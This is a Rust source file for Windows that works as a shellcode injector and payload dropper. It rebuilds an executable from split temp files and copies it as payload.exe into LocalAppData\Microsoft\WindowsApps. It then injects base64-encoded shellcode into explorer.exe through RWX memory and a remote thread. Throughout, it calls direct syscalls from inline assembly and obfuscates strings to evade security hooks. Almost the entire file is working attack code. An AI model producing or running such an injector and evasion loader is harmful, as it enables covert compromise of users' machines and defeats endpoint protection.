// main.rs

use std::mem;
use std::ptr;
use core::arch::global_asm;
use polimorphic::str_obf;
use windows::{
    core::*,
    Win32::System::Diagnostics::ToolHelp::*,
    Win32::Foundation::*,
    Win32::Storage::FileSystem::*,
    Win32::UI::Shell::*,
    Win32::System::Com::*,
};
use windows_sys::Win32::System::Threading::{PROCESS_ALL_ACCESS};
use windows_sys::Win32::System::WindowsProgramming::{CLIENT_ID, OBJECT_ATTRIBUTES, IO_STATUS_BLOCK};
use windows_sys::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};
use windows_sys::Win32::Foundation::{HANDLE, NTSTATUS, UNICODE_STRING};
use base64::Engine;
use base64::engine::general_purpose;

mod syscall;

global_asm!(r#"
.global asm_nt_open_process
asm_nt_open_process:
    mov r10, rcx
    mov eax, [rsp + 0x28]
    syscall
    ret

.global asm_nt_allocate_virtual_memory
asm_nt_allocate_virtual_memory:
    mov r10, rcx
    mov eax, [rsp + 0x38]
    syscall
    ret

.global asm_nt_write_virtual_memory
asm_nt_write_virtual_memory:
    mov r10, rcx
    mov eax, [rsp + 0x30]
    syscall
    ret

.global asm_nt_create_thread_ex
asm_nt_create_thread_ex:
    mov r10, rcx
    mov eax, [rsp + 0x60]
    syscall
    ret

.global asm_nt_close
asm_nt_close:
    mov r10, rcx
    mov eax, edx
    syscall
    ret

.global asm_nt_create_file
asm_nt_create_file:
    mov r10, rcx
    mov eax, [rsp + 0x60]
    syscall
    ret

.global asm_nt_read_file
asm_nt_read_file:
    mov r10, rcx
    mov eax, [rsp + 0x50]
    syscall
    ret

.global asm_nt_write_file
asm_nt_write_file:
    mov r10, rcx
    mov eax, [rsp + 0x50]
    syscall
    ret
"#);

extern "C" {
    fn asm_nt_open_process(ProcessHandle: &mut HANDLE, DesiredAccess: u32, ObjectAttributes: &mut OBJECT_ATTRIBUTES, ClientId: &mut CLIENT_ID, syscall_id: u32) -> NTSTATUS;
    fn asm_nt_allocate_virtual_memory(ProcessHandle: HANDLE, BaseAddress: &mut *mut std::ffi::c_void, ZeroBits: u32, RegionSize: &mut usize, AllocationType: u32, Protect: u32, syscall_id: u32) -> NTSTATUS;
    fn asm_nt_write_virtual_memory(ProcessHandle: HANDLE, BaseAddress: *mut std::ffi::c_void, Buffer: *const std::ffi::c_void, NumberOfBytesToWrite: usize, NumberOfBytesWritten: &mut usize, syscall_id: u32) -> NTSTATUS;
    fn asm_nt_create_thread_ex(ThreadHandle: &mut HANDLE, DesiredAccess: u32, ObjectAttributes: *mut OBJECT_ATTRIBUTES, ProcessHandle: HANDLE, StartRoutine: *mut std::ffi::c_void, Argument: *mut std::ffi::c_void, CreateFlags: u32, ZeroBits: usize, StackSize: usize, MaximumStackSize: usize, AttributeList: *mut std::ffi::c_void, syscall_id: u32) -> NTSTATUS;
    fn asm_nt_close(Handle: HANDLE, syscall_id: u32) -> NTSTATUS;
    fn asm_nt_create_file(FileHandle: &mut HANDLE, DesiredAccess: u32, ObjectAttributes: &mut OBJECT_ATTRIBUTES, IoStatusBlock: &mut IO_STATUS_BLOCK, AllocationSize: *mut i64, FileAttributes: u32, ShareAccess: u32, CreateDisposition: u32, CreateOptions: u32, EaBuffer: *mut std::ffi::c_void, EaLength: u32, syscall_id: u32) -> NTSTATUS;
    fn asm_nt_read_file(FileHandle: HANDLE, Event: HANDLE, ApcRoutine: *mut std::ffi::c_void, ApcContext: *mut std::ffi::c_void, IoStatusBlock: &mut IO_STATUS_BLOCK, Buffer: *mut std::ffi::c_void, Length: u32, ByteOffset: *mut i64, Key: *mut u32, syscall_id: u32) -> NTSTATUS;
    fn asm_nt_write_file(FileHandle: HANDLE, Event: HANDLE, ApcRoutine: *mut std::ffi::c_void, ApcContext: *mut std::ffi::c_void, IoStatusBlock: &mut IO_STATUS_BLOCK, Buffer: *const std::ffi::c_void, Length: u32, ByteOffset: *mut i64, Key: *mut u32, syscall_id: u32) -> NTSTATUS;
}

const ENCODED_SHELLCODE: &str = "/EiB5PD////o0AAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0b0gB0FCLSBhEi0AgSQHQ41xI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpT////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//Vu/C1olZBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VSGVsbG8gZnJvbSBKdWxlcyEASnVsZXMA";

fn get_explorer_pid() -> Option<u32> {
    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0).ok()?;
        if snapshot.is_invalid() {
            return None;
        }

        let mut process_entry: PROCESSENTRY32 = mem::zeroed();
        process_entry.dwSize = mem::size_of::<PROCESSENTRY32>() as u32;

        if Process32First(snapshot, &mut process_entry).is_ok() {
            loop {
                let end = process_entry.szExeFile.iter().position(|&c| c == 0).unwrap_or(260);
                let bytes = std::slice::from_raw_parts(process_entry.szExeFile.as_ptr() as *const u8, end);
                let process_name = String::from_utf8_lossy(bytes);
                if process_name == str_obf!("explorer.exe") {
                    let _ = CloseHandle(snapshot);
                    return Some(process_entry.th32ProcessID);
                }

                if Process32Next(snapshot, &mut process_entry).is_err() {
                    break;
                }
            }
        }
        let _ = CloseHandle(snapshot);
    }
    None
}

fn init_unicode_string(s: &mut UNICODE_STRING, buffer: &[u16]) {
    s.Length = (buffer.len() * 2) as u16;
    s.MaximumLength = (buffer.len() * 2) as u16;
    s.Buffer = buffer.as_ptr() as *mut u16;
}

fn merge_and_reconstruct_payload() {
    unsafe {
        let nt_create_file_id = syscall::get_syscall_number(&str_obf!("NtCreateFile")).expect("NtCreateFile syscall not found");
        let nt_read_file_id = syscall::get_syscall_number(&str_obf!("NtReadFile")).expect("NtReadFile syscall not found");
        let nt_write_file_id = syscall::get_syscall_number(&str_obf!("NtWriteFile")).expect("NtWriteFile syscall not found");
        let nt_close_id = syscall::get_syscall_number(&str_obf!("NtClose")).expect("NtClose syscall not found");

        // 1. Get Temp Path
        let mut temp_path = [0u16; 260];
        let len = GetTempPathW(Some(&mut temp_path));
        let temp_dir = String::from_utf16_lossy(&temp_path[..len as usize]);

        // 2. Prepare paths
        let files = [str_obf!("1.tmp"), str_obf!("2.tmp"), str_obf!("3.tmp")];
        let mut reconstructed_path = temp_dir.clone();
        reconstructed_path.push_str(&str_obf!("reconstructed.exe"));

        // 3. Create reconstructed.exe
        let mut h_reconstructed: HANDLE = 0;
        let mut io_status = mem::zeroed::<IO_STATUS_BLOCK>();

        let nt_reconstructed_path = format!("\\??\\{}", reconstructed_path);
        let nt_reconstructed_path_u16: Vec<u16> = nt_reconstructed_path.encode_utf16().collect();
        let mut unicode_reconstructed = mem::zeroed::<UNICODE_STRING>();
        init_unicode_string(&mut unicode_reconstructed, &nt_reconstructed_path_u16);

        let mut obj_attr_reconstructed = OBJECT_ATTRIBUTES {
            Length: mem::size_of::<OBJECT_ATTRIBUTES>() as u32,
            RootDirectory: 0,
            ObjectName: &mut unicode_reconstructed,
            Attributes: 0x40, // OBJ_CASE_INSENSITIVE
            SecurityDescriptor: ptr::null_mut(),
            SecurityQualityOfService: ptr::null_mut(),
        };

        let status = asm_nt_create_file(
            &mut h_reconstructed,
            0x40000000 | 0x00100000, // GENERIC_WRITE | SYNCHRONIZE
            &mut obj_attr_reconstructed,
            &mut io_status,
            ptr::null_mut(),
            0x80, // FILE_ATTRIBUTE_NORMAL
            0,
            2, // FILE_CREATE or FILE_OVERWRITE_IF
            0x20, // FILE_SYNCHRONOUS_IO_NONALERT
            ptr::null_mut(),
            0,
            nt_create_file_id
        );

        if status != 0 { return; }

        for file_name in files {
            let full_path = format!("{}{}", temp_dir, file_name);
            let nt_path = format!("\\??\\{}", full_path);
            let nt_path_u16: Vec<u16> = nt_path.encode_utf16().collect();
            let mut unicode_path = mem::zeroed::<UNICODE_STRING>();
            init_unicode_string(&mut unicode_path, &nt_path_u16);

            let mut obj_attr = OBJECT_ATTRIBUTES {
                Length: mem::size_of::<OBJECT_ATTRIBUTES>() as u32,
                RootDirectory: 0,
                ObjectName: &mut unicode_path,
                Attributes: 0x40,
                SecurityDescriptor: ptr::null_mut(),
                SecurityQualityOfService: ptr::null_mut(),
            };

            let mut h_file: HANDLE = 0;
            let status = asm_nt_create_file(
                &mut h_file,
                0x80000000 | 0x00100000, // GENERIC_READ | SYNCHRONIZE
                &mut obj_attr,
                &mut io_status,
                ptr::null_mut(),
                0,
                1, // FILE_SHARE_READ
                1, // FILE_OPEN
                0x20,
                ptr::null_mut(),
                0,
                nt_create_file_id
            );

            if status == 0 {
                let mut buffer = [0u8; 8192];
                loop {
                    let mut read_status_block = mem::zeroed::<IO_STATUS_BLOCK>();
                    let status = asm_nt_read_file(
                        h_file,
                        0,
                        ptr::null_mut(),
                        ptr::null_mut(),
                        &mut read_status_block,
                        buffer.as_mut_ptr() as *mut _,
                        buffer.len() as u32,
                        ptr::null_mut(),
                        ptr::null_mut(),
                        nt_read_file_id
                    );

                    if status != 0 { break; }
                    let bytes_read = read_status_block.Information as u32;
                    if bytes_read == 0 { break; }

                    let mut write_status_block = mem::zeroed::<IO_STATUS_BLOCK>();
                    asm_nt_write_file(
                        h_reconstructed,
                        0,
                        ptr::null_mut(),
                        ptr::null_mut(),
                        &mut write_status_block,
                        buffer.as_ptr() as *const _,
                        bytes_read,
                        ptr::null_mut(),
                        ptr::null_mut(),
                        nt_write_file_id
                    );
                }
                asm_nt_close(h_file, nt_close_id);
            }
        }
        asm_nt_close(h_reconstructed, nt_close_id);

        // 4. Get target path
        let mut local_app_data_path: PWSTR = PWSTR(ptr::null_mut());
        if SHGetKnownFolderPath(&FOLDERID_LocalAppData, KF_FLAG_DEFAULT, None, &mut local_app_data_path).is_ok() {
            let local_app_data = local_app_data_path.to_string().unwrap();
            CoTaskMemFree(Some(local_app_data_path.0 as *const _));

            let target_dir = format!("{}\\{}", local_app_data, str_obf!("Microsoft\\WindowsApps"));
            let target_exe = format!("{}\\{}", target_dir, str_obf!("payload.exe"));

            // 5. Copy using Syscalls (Read from reconstructed, write to target)
            copy_file_syscalls(&reconstructed_path, &target_exe, nt_create_file_id, nt_read_file_id, nt_write_file_id, nt_close_id);
        }
    }
}

unsafe fn copy_file_syscalls(src: &str, dst: &str, create_id: u32, read_id: u32, write_id: u32, close_id: u32) {
    let mut h_src: HANDLE = 0;
    let mut h_dst: HANDLE = 0;
    let mut io_status = mem::zeroed::<IO_STATUS_BLOCK>();

    let nt_src = format!("\\??\\{}", src);
    let nt_src_u16: Vec<u16> = nt_src.encode_utf16().collect();
    let mut unicode_src = mem::zeroed::<UNICODE_STRING>();
    init_unicode_string(&mut unicode_src, &nt_src_u16);
    let mut obj_attr_src = OBJECT_ATTRIBUTES {
        Length: mem::size_of::<OBJECT_ATTRIBUTES>() as u32,
        RootDirectory: 0,
        ObjectName: &mut unicode_src,
        Attributes: 0x40,
        SecurityDescriptor: ptr::null_mut(),
        SecurityQualityOfService: ptr::null_mut(),
    };

    if asm_nt_create_file(&mut h_src, 0x80000000 | 0x00100000, &mut obj_attr_src, &mut io_status, ptr::null_mut(), 0, 1, 1, 0x20, ptr::null_mut(), 0, create_id) != 0 {
        return;
    }

    let nt_dst = format!("\\??\\{}", dst);
    let nt_dst_u16: Vec<u16> = nt_dst.encode_utf16().collect();
    let mut unicode_dst = mem::zeroed::<UNICODE_STRING>();
    init_unicode_string(&mut unicode_dst, &nt_dst_u16);
    let mut obj_attr_dst = OBJECT_ATTRIBUTES {
        Length: mem::size_of::<OBJECT_ATTRIBUTES>() as u32,
        RootDirectory: 0,
        ObjectName: &mut unicode_dst,
        Attributes: 0x40,
        SecurityDescriptor: ptr::null_mut(),
        SecurityQualityOfService: ptr::null_mut(),
    };

    if asm_nt_create_file(&mut h_dst, 0x40000000 | 0x00100000, &mut obj_attr_dst, &mut io_status, ptr::null_mut(), 0x80, 0, 5, 0x20, ptr::null_mut(), 0, create_id) == 0 {
        let mut buffer = [0u8; 8192];
        loop {
            let mut read_sb = mem::zeroed::<IO_STATUS_BLOCK>();
            if asm_nt_read_file(h_src, 0, ptr::null_mut(), ptr::null_mut(), &mut read_sb, buffer.as_mut_ptr() as *mut _, buffer.len() as u32, ptr::null_mut(), ptr::null_mut(), read_id) != 0 {
                break;
            }
            let bytes = read_sb.Information as u32;
            if bytes == 0 { break; }
            let mut write_sb = mem::zeroed::<IO_STATUS_BLOCK>();
            asm_nt_write_file(h_dst, 0, ptr::null_mut(), ptr::null_mut(), &mut write_sb, buffer.as_ptr() as *const _, bytes, ptr::null_mut(), ptr::null_mut(), write_id);
        }
        asm_nt_close(h_dst, close_id);
    }
    asm_nt_close(h_src, close_id);
}

fn main() {
    // 0. Merge and reconstruct payload
    merge_and_reconstruct_payload();

    let shellcode = general_purpose::STANDARD.decode(ENCODED_SHELLCODE).unwrap();

    // 1. Get explorer.exe PID
    let explorer_pid = get_explorer_pid().expect("Failed to find explorer.exe PID.");

    // 2. Open a handle to the process
    let mut process_handle: HANDLE = 0;
    let mut object_attributes: OBJECT_ATTRIBUTES = unsafe { mem::zeroed() };
    let mut client_id: CLIENT_ID = unsafe { mem::zeroed() };
    client_id.UniqueProcess = explorer_pid as _;

    let nt_open_process_syscall = syscall::get_syscall_number(&str_obf!("NtOpenProcess"))
        .expect("Failed to get syscall number for NtOpenProcess");

    let status = unsafe {
        asm_nt_open_process(
            &mut process_handle,
            PROCESS_ALL_ACCESS,
            &mut object_attributes,
            &mut client_id,
            nt_open_process_syscall,
        )
    };

    if status != 0 { return; }

    // 3. Allocate memory
    let mut alloc_addr: *mut std::ffi::c_void = std::ptr::null_mut();
    let mut size = shellcode.len();
    let nt_allocate_virtual_memory_syscall = syscall::get_syscall_number(&str_obf!("NtAllocateVirtualMemory"))
        .expect("Failed to get syscall number for NtAllocateVirtualMemory");

    let status = unsafe {
        asm_nt_allocate_virtual_memory(
            process_handle,
            &mut alloc_addr,
            0,
            &mut size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
            nt_allocate_virtual_memory_syscall,
        )
    };

    if status != 0 { return; }

    // 4. Write shellcode to the allocated memory
    let mut bytes_written = 0;
    let nt_write_virtual_memory_syscall = syscall::get_syscall_number(&str_obf!("NtWriteVirtualMemory"))
        .expect("Failed to get syscall number for NtWriteVirtualMemory");

    let status = unsafe {
        asm_nt_write_virtual_memory(
            process_handle,
            alloc_addr,
            shellcode.as_ptr() as *const _,
            shellcode.len(),
            &mut bytes_written,
            nt_write_virtual_memory_syscall,
        )
    };

    if status != 0 { return; }

    // 5. Create a remote thread to execute the shellcode
    let mut thread_handle: HANDLE = 0;
    let nt_create_thread_ex_syscall = syscall::get_syscall_number(&str_obf!("NtCreateThreadEx"))
        .expect("Failed to get syscall number for NtCreateThreadEx");

    let status = unsafe {
        asm_nt_create_thread_ex(
            &mut thread_handle,
            PROCESS_ALL_ACCESS,
            std::ptr::null_mut(),
            process_handle,
            alloc_addr,
            std::ptr::null_mut(),
            0,
            0,
            0,
            0,
            std::ptr::null_mut(),
            nt_create_thread_ex_syscall,
        )
    };

    if status != 0 { return; }

    // 6. Close handles
    let nt_close_syscall = syscall::get_syscall_number(&str_obf!("NtClose"))
        .expect("Failed to get syscall number for NtClose");

    unsafe {
        asm_nt_close(thread_handle, nt_close_syscall);
        asm_nt_close(process_handle, nt_close_syscall);
    }
}
